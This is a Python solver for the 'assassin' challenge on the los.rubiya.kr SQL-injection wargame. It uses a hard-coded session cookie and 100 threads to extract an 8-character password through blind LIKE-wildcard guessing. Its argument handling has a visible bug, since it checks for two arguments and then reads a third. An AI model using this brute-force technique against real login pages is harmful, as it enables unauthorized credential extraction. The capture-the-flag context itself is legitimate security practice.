#!/bin/python3
import sys
import time
from concurrent.futures.thread import ThreadPoolExecutor
import requests
import itertools as it

st = time.time()

if len(sys.argv) == 2:
    url = sys.argv[1]
    php_cookie = sys.argv[2]
else:
    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
    php_cookie = "9tsj5uo60kqf7dnts3kabmmb2d"

result = [' '] * 8


def is_correct(pw):
    r = requests.get(url,
                     params={"pw": pw},
                     cookies={"PHPSESSID": php_cookie})
    return "dmin</h2>" in r.content.decode("UTF-8")


def check_char(pos, c):
    return is_correct('_'*(pos-1) + chr(c) + '%')


def compute_char(t):
    c, pos = t
    if result[pos-1] != ' ':
        return 1
    if check_char(pos, c):
        result[pos - 1] = chr(c)
    return 1


letters_it = it.chain(range(ord('0'), ord('9') + 1), range(ord('a'), ord('z') + 1))
pos_it = range(1, 9)
prod_it = it.product(letters_it, pos_it)

with ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(compute_char, prod_it)
    executor.shutdown(wait=True)

print(result)
print("time to finish: ", time.time() - st)